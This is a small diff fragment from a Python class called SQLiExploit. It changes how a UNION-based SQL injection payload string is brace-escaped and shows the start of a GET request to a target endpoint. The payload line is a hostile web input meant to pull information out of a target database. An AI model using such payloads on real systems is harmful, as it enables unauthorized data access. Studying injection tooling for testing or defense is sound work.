@@ -7443,7 +7443,7 @@ class SQLiExploit:
         results = {{}}
         
         for info_type, query in queries.items():
-            payload = f"1' UNION SELECT 1,({query}),3--"
+            payload = f"1' UNION SELECT 1,({{query}}),3--"
             try:
                 response = self.session.get(
                     f"{{self.target_url}}{{self.endpoint}}",
